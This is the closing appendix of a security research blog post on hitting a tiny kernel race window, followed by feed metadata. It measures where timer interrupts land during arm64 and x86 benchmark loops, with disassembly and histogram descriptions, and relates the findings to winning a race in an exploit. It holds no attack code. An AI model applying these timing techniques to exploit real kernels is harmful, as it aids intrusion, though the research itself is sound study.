 <p class="c3"><span class="c1">Also, precisely timing races is hard, and the details of how long it actually takes the CPU to get from one point to another are mysterious. (As not only exploit writers know, but also anyone who&#39;s ever wanted to benchmark a performance-relevant change...)</span></p><h1 class="c15" id="h.adfta2d6xkv8"><span>Appendix: How impatient are interrupts?</span></h1>
 <p class="c3"><span class="c1">I did also play around with this stuff on arm64 a bit, and I was wondering: At what points do interrupts actually get delivered? Does an incoming interrupt force the CPU to drop everything immediately, or do inflight operations finish first? This gets particularly interesting on phones that contain two or three different types of CPUs mixed together.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>On a Pixel 4 (which has 4 slow in-order cores, 3 fast cores, and 1 faster core), I tried firing an interval timer at 100Hz (using </span><span class="c4">timer_create()</span><span>), with a signal handler that logs the </span><span class="c4">PC</span><span class="c1">&nbsp;register, while running this loop:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 400680:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 400684:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 400688:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9ac20820 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;udiv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x1, x2</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 40068c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91006800 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1a</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 400690:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000400 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 400694:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 400698:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 40069c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006a0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006a4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9ac20820 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;udiv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x1, x2</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006a8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91006800 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1a</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006ac:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000400 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006b0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006b4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006b8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006bc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006c0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17fffff0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;400680 &lt;main+0xe0&gt;</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">The logged interrupt PCs had the following distribution on a slow in-order core:</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh79bjjrDomCArX8YgAAX47nW6vfXNUUi0_WFbvS4ivPBjbOugqTtH7OZ5ZdRU9RYiHBfKiyUTEJRZCBn_mFN_MP9-v0krZKVaEoVq6mGyqkqNjx0H-2YULQe5ONPIyVrjJ7XBXY0y2UM7IkZfUHUJiVR0XYGYcZrLmDGeAecRkHStfXAmSzGmsT20D/s1252/image3%286%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh79bjjrDomCArX8YgAAX47nW6vfXNUUi0_WFbvS4ivPBjbOugqTtH7OZ5ZdRU9RYiHBfKiyUTEJRZCBn_mFN_MP9-v0krZKVaEoVq6mGyqkqNjx0H-2YULQe5ONPIyVrjJ7XBXY0y2UM7IkZfUHUJiVR0XYGYcZrLmDGeAecRkHStfXAmSzGmsT20D/s1252/image3%286%29.png" border="0" alt="A histogram of PC register values, where most instructions in the loop have roughly equal frequency, the instructions after udiv instructions have twice the frequency, and two other instructions have zero frequency." style="max-height: 750; max-width: 600px;"title="A histogram of PC register values, where most instructions in the loop have roughly equal frequency, the instructions after udiv instructions have twice the frequency, and two other instructions have zero frequency." /></a></span></p>
 <p class="c3"><span class="c1">and this distribution on a fast out-of-order core:</span></p>
 <p class="c3"></p>

 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD-BHvjdNFWdHXsha29a8w8Yo62kCoCH7QlHdXcQQHNECyyTM2BdG2Yxy2DL5UBT-XRMVSWeQbYaUBgpbKeBeQPU7AXTyS9J9twZ7eC5TyvBSNtU1p6J5ulb8yaWVAH359IfKzzsI9g8z1hgfcEwhiP3k1LFo_G-dsXpXFLF4A0cyiRTs7yrPpa8ac/s1252/image7%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD-BHvjdNFWdHXsha29a8w8Yo62kCoCH7QlHdXcQQHNECyyTM2BdG2Yxy2DL5UBT-XRMVSWeQbYaUBgpbKeBeQPU7AXTyS9J9twZ7eC5TyvBSNtU1p6J5ulb8yaWVAH359IfKzzsI9g8z1hgfcEwhiP3k1LFo_G-dsXpXFLF4A0cyiRTs7yrPpa8ac/s1252/image7%283%29.png" border="0" alt="A histogram of PC register values, where the first instruction of the loop has very high frequency, the following 4 instructions have near-zero frequency, and the following instructions have low frequencies" style="max-height: 750; max-width: 600px;"title="A histogram of PC register values, where the first instruction of the loop has very high frequency, the following 4 instructions have near-zero frequency, and the following instructions have low frequencies" /></a></span></p>
 <p class="c3"><span>As always, out-of-order (OOO) cores make everything weird, and the start of the loop seems to somehow &quot;provide cover&quot; for the following instructions; but on the in-order core, we can see that more interrupts arrive </span><span class="c6">after</span><span class="c1">&nbsp;the slow udiv instructions. So apparently, when one of those is executing while an interrupt arrives, it continues executing and doesn&#39;t get aborted somehow?</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>With the following loop, which has a </span><span class="c4">LDR</span><span class="c1">&nbsp;instruction mixed in that accesses a memory location that is constantly being modified by another thread:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006a0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006a4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006a8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9ac20820 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;udiv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x1, x2</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006ac:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91006800 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1a</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006b0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000400 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006b4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006b8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006bc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006c0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006c4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9ac20820 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;udiv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x1, x2</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006c8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91006800 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1a</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006cc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000400 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x0, x0, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006d0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006d4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f9400061 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ldr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, [x3]</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006d8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006dc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000442 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2, x2, #0x1</span></p>
 <p class="c3"><span class="c4 c7">&nbsp; 4006e0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;91000421 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1, x1, #0x1</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; 4006e4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17ffffef &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4006a0 &lt;main+0x100&gt;</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">the cache-missing loads obviously have a large influence on the timing. On the in-order core:</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhd2RdxeFWLW-EaNH0BmFh0bR7cTAxUQWltgd1v4192uhqNBPjlZOfcAjPF11Bh4bFpMN0Qu2iMTSiYwz8nzNwvAEPfopJDb9ZP4PG-3FMTULgznbXTsX9y5PMie65S3L4EGX1tQ_7Be53ettw-tmsP8lhP8G_sDGIeq5DwC9dqN8Y7oAc3SNBz6Hrn/s1252/image4%285%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhd2RdxeFWLW-EaNH0BmFh0bR7cTAxUQWltgd1v4192uhqNBPjlZOfcAjPF11Bh4bFpMN0Qu2iMTSiYwz8nzNwvAEPfopJDb9ZP4PG-3FMTULgznbXTsX9y5PMie65S3L4EGX1tQ_7Be53ettw-tmsP8lhP8G_sDGIeq5DwC9dqN8Y7oAc3SNBz6Hrn/s1252/image4%285%29.png" border="0" alt="A histogram of interrupt instruction pointers, showing that most interrupts are delivered with PC pointing to the instruction after the high-latency load instruction." style="max-height: 750; max-width: 600px;"title="A histogram of interrupt instruction pointers, showing that most interrupts are delivered with PC pointing to the instruction after the high-latency load instruction." /></a></span></p>
 <p class="c3"><span class="c1">On the OOO core:</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihTJNVw4C-vyBUdzEIFRX4tkgjk9rcnZMnn6JEAUQ3LP-NZexmmNFvL1T8LyHtIPmAbMso2arHvB4eBjB81HHxWZgO-wfQpN_Afs48fmZvEVzysO2ov7kawLQFfjq1dJvD4t8oi_5ZnYklJx5MP3jbaDrMrtXeaQlIW6tjsRoYcywfbHt_3o-pd8Yc/s1297/image20.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihTJNVw4C-vyBUdzEIFRX4tkgjk9rcnZMnn6JEAUQ3LP-NZexmmNFvL1T8LyHtIPmAbMso2arHvB4eBjB81HHxWZgO-wfQpN_Afs48fmZvEVzysO2ov7kawLQFfjq1dJvD4t8oi_5ZnYklJx5MP3jbaDrMrtXeaQlIW6tjsRoYcywfbHt_3o-pd8Yc/s1297/image20.png" border="0" alt="A similar histogram as the previous one, except that an even larger fraction of interrupt PCs are after the high-latency load instruction." style="max-height: 750; max-width: 600px;"title="A similar histogram as the previous one, except that an even larger fraction of interrupt PCs are after the high-latency load instruction." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>What is interesting to me here is that the timer interrupts seem to again arrive </span><span class="c6">after</span><span class="c1">&nbsp;the slow load - implying that if an interrupt arrives while a slow memory access is in progress, the interrupt handler may not get to execute until the memory access has finished? (Unless maybe on the OOO core the interrupt handler can start speculating already? I wouldn&#39;t really expect that, but could imagine it.)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">On an X86 Skylake CPU, we can do a similar test:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11b8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c3 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rbx</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11bc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c0 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11c0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 01 d8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;%rbx,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11c3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c3 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rbx</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11c7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c0 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11cb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 01 d8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;%rbx,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11ce:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 03 02 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;(%rdx),%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11d1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c0 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11d5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c3 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rbx</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11d9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 01 d8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;%rbx,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11dc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c3 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rbx</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11e0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 83 c0 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;$0x1,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11e4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48 01 d8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add &nbsp; &nbsp;%rbx,%rax</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; 11e7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eb cf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp &nbsp; &nbsp;11b8 &lt;main+0xf8&gt;</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">with a similar result:</span></p>
 <p class="c3"></p>
  
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifbDV2Uu_gXT_0s8hOyj3wImUB1O17c9SHpIEkkmAEES8GbgyHlSaPjbESG6SBIbdPPp3sTDao1A_SAcs4CfmgljAY3wa8KKeIQ4Lsg_L0nXFQY-qWL_-vDGyQnSN3vvt2YUmWf2-5WS81VqprDiz5YMq94_k9r1iVRuArhgWcfNBHBU-HtzJrWmX8/s540/image14.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifbDV2Uu_gXT_0s8hOyj3wImUB1O17c9SHpIEkkmAEES8GbgyHlSaPjbESG6SBIbdPPp3sTDao1A_SAcs4CfmgljAY3wa8KKeIQ4Lsg_L0nXFQY-qWL_-vDGyQnSN3vvt2YUmWf2-5WS81VqprDiz5YMq94_k9r1iVRuArhgWcfNBHBU-HtzJrWmX8/s540/image14.png" border="0" alt="A histogram of interrupt instruction pointers, showing that almost all interrupts were delivered with RIP pointing to the instruction after the high-latency load." style="max-height: 750; max-width: 600px;"title="A histogram of interrupt instruction pointers, showing that almost all interrupts were delivered with RIP pointing to the instruction after the high-latency load." /></a></span></p>
 <p class="c3"><span>This means that </span><span class="c6">if</span><span>&nbsp;the first access to the file terminated our race window (which is not the case), we probably wouldn&#39;t be able to win the race by making the access to the file slow - instead we&#39;d have to slow down one of the operations before that. (But note that I have only tested simple loads, not stores or read-modify-write operations here.)</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/2892029424446991022/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/2892029424446991022
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/2892029424446991022
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html
## @title
Racing against the clock -- hitting a tiny kernel race window
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
